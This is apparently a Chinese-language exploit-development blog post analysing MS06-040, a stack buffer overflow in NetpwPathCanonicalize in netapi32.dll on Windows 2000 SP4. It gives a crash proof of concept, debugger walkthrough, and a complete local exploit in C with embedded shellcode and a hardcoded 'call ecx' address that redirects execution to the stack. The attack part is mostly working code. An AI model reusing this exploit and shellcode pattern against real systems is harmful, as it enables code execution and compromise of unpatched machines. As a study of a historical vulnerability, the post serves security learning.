---
layout:		post
title:		RPC入侵：MS06-040
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows 2000 sp4  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

编译POC, 运行

```
#include"stdafx.h"
#include <windows.h>

typedef void (*MYPROC)(LPTSTR, char *, int, char *, long *, bool);

int main()
{	
	char path[0x320];
	char can_path[0x440];
	int maxbuf=0x440;
	char prefix[0x100];
	long pathtype=44;

	HINSTANCE LibHandle;
	MYPROC Trigger;

	char dll[ ] = "./netapi32.dll";
	char VulFunc[ ] = "NetpwPathCanonicalize";
	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);

	memset(path,0,sizeof(path));
	memset(path,'a',sizeof(path)-2);
	memset(prefix,0,sizeof(prefix));
	memset(prefix,'b',sizeof(prefix)-2);
	
	(Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);
	FreeLibrary(LibHandle);

	return 0;
}
```

程序崩溃掉, OD附加上去, EIP被"aaaa"填充

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x00.png)

执行文件拖到OD, 单步来到call netapi32.NetpwPathCanonicalize, 再往下程序崩掉

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x01.png)

跟进NetpwPathCanonicalize函数, 执行MSVCRT.wcscat, 当retn时程序再次崩溃

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x02.png)

此处应该就是崩溃点, 在IDA定位到该函数

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x03.png)

copy"bbbbbb..."串到栈上

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x04.png)

"bbbbb..."串尾部拼接一个0x005C

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x05.png)

继续拼接"aaaaa..."串, 覆盖返回地址

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x06.png)


### 0x01 本地exploit

观察在retn时, ecx指向缓冲区的开始

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x07.png)

可以把shellcode布置在"bbbbbb...."串里, 用一条call/jmp ecx跳到栈上执行

```
// ms06_040_exp.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>

typedef void (*MYPROC)(LPTSTR, char *, int, char *, long *, bool);

char shellcode[]=
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";

int main()
{	
	char path[0x320];
	char can_path[0x440];
	int maxbuf=0x440;
	char prefix[0x100];
	long pathtype=44;
	
	HINSTANCE LibHandle;
	MYPROC Trigger;

	char dll[] = "./netapi32.dll";
	char VulFunc[] = "NetpwPathCanonicalize";

	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);

	memset(path,0,sizeof(path));
	memset(path,0x90,sizeof(path)-2);
	memset(prefix,0,sizeof(prefix));
	memset(prefix,'a',sizeof(prefix)-2);
	memcpy(prefix,shellcode,113);

	path[0x318]=0xF9;		// call ecx
	path[0x319]=0x52;
	path[0x31A]=0x18;
	path[0x31B]=0x75;

	(Trigger)(path,can_path,maxbuf,prefix,&pathtype,0);
	FreeLibrary(LibHandle);

	return 0;
}
```

pwn~

![](/assets/img/exploit/2018-01-02-ms06-040-rpc-exploit/0x08.png)